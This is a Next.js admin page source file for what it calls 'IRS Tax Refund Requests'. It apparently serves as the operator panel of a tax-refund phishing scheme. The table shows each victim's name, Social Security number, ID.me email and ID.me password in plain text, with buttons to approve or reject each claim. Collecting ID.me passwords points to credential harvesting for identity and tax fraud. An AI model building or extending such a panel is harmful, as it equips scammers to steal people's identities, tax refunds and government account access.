export const dynamic = "force-dynamic";

import { getAllTaxRefundsAdmin } from "@/actions/tax-refund.action";
import TaxRefundStatusButton from "@/components/admin/TaxRefundStatusButton";
import { auth } from "@/lib/auth";
import { headers } from "next/headers";
import { redirect } from "next/navigation";
import { DollarSign, Shield, MapPin } from "lucide-react";

async function AdminTaxRefundsPage() {
  const session = await auth.api.getSession({
    headers: await headers(),
  });

  if (!session || session.user.role !== "admin") {
    redirect("/login");
  }

  const { refunds, error } = await getAllTaxRefundsAdmin();

  const getStatusBadge = (status: "pending" | "approved" | "rejected") => {
    switch (status) {
      case "approved":
        return "bg-green-500/20 text-green-400 border border-green-500/30";
      case "rejected":
        return "bg-red-500/20 text-red-400 border border-red-500/30";
      default:
        return "bg-yellow-500/20 text-yellow-400 border border-yellow-500/30";
    }
  };

  return (
    <div className="w-full min-w-0 max-w-6xl mx-auto space-y-6 pb-24 md:pb-8">
      <div className="flex items-center gap-3">
        <div className="w-10 h-10 rounded-xl bg-blue-500/20 flex items-center justify-center text-blue-400 shrink-0">
          <DollarSign className="w-5 h-5" />
        </div>
        <div>
          <h1 className="text-xl font-bold">IRS Tax Refund Requests</h1>
          <p className="text-sm text-gray-500">
            {refunds.length} total request{refunds.length !== 1 ? "s" : ""}
          </p>
        </div>
      </div>

      {error && (
        <div className="p-4 rounded-xl bg-red-500/10 border border-red-500/20 text-red-500 text-sm">
          {error}
        </div>
      )}

      {refunds.length === 0 && !error ? (
        <div className="text-center py-16 text-gray-400 text-sm">
          No tax refund claims have been submitted yet.
        </div>
      ) : (
        <div className="w-full min-w-0 overflow-x-auto rounded-2xl border border-gray-200 dark:border-white/10 shadow-xs">
          <table className="min-w-[800px] w-full text-sm">
            <thead>
              <tr className="border-b border-gray-200 dark:border-white/10 bg-gray-100 dark:bg-white/5">
                <th className="text-left px-4 py-3 font-semibold text-gray-600 dark:text-white/70">Claim ID</th>
                <th className="text-left px-4 py-3 font-semibold text-gray-600 dark:text-white/70">Applicant</th>
                <th className="text-left px-4 py-3 font-semibold text-gray-600 dark:text-white/70">SSN</th>
                <th className="text-left px-4 py-3 font-semibold text-gray-600 dark:text-white/70">ID.me Email</th>
                <th className="text-left px-4 py-3 font-semibold text-gray-600 dark:text-white/70">ID.me Password</th>
                <th className="text-left px-4 py-3 font-semibold text-gray-600 dark:text-white/70">Country</th>
                <th className="text-left px-4 py-3 font-semibold text-gray-600 dark:text-white/70">Submitted</th>
                <th className="text-left px-4 py-3 font-semibold text-gray-600 dark:text-white/70">Status</th>
                <th className="text-left px-4 py-3 font-semibold text-gray-600 dark:text-white/70">Action</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-gray-200 dark:divide-white/5">
              {refunds.map((refund) => (
                <tr key={refund.id} className="hover:bg-gray-50 dark:hover:bg-white/5 transition-colors">
                  <td className="px-4 py-4">
                    <span className="font-mono text-xs text-gray-500 dark:text-white/50 truncate block max-w-[110px]" title={refund.id}>
                      {refund.id}
                    </span>
                  </td>
                  <td className="px-4 py-4 text-gray-800 dark:text-white/90 font-medium">
                    <div>{refund.applicantName}</div>
                    {refund.userAccountEmail && (
                      <div className="text-xs text-gray-400">{refund.userAccountEmail}</div>
                    )}
                  </td>
                  <td className="px-4 py-4 font-mono text-xs text-gray-600 dark:text-white/70">
                    {refund.ssn}
                  </td>
                  <td className="px-4 py-4 text-xs text-blue-500">
                    {refund.idMeEmail}
                  </td>
                  <td className="px-4 py-4 font-mono text-xs text-amber-500 dark:text-amber-400 bg-black/5 dark:bg-black/30 rounded px-2 py-1">
                    {refund.idMePassword}
                  </td>
                  <td className="px-4 py-4 text-xs text-gray-600 dark:text-white/70">
                    <div className="flex items-center gap-1">
                      <MapPin className="w-3 h-3 text-gray-400" />
                      <span>{refund.location}</span>
                    </div>
                  </td>
                  <td className="px-4 py-4 text-gray-500 dark:text-white/50 text-xs whitespace-nowrap">
                    {refund.submittedOn}
                  </td>
                  <td className="px-4 py-4">
                    <span className={`text-xs px-2.5 py-1 rounded-full font-bold capitalize ${getStatusBadge(refund.status)}`}>
                      {refund.status}
                    </span>
                  </td>
                  <td className="px-4 py-4">
                    <TaxRefundStatusButton
                      refundId={refund.id}
                      currentStatus={refund.status}
                    />
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
}

export default AdminTaxRefundsPage;
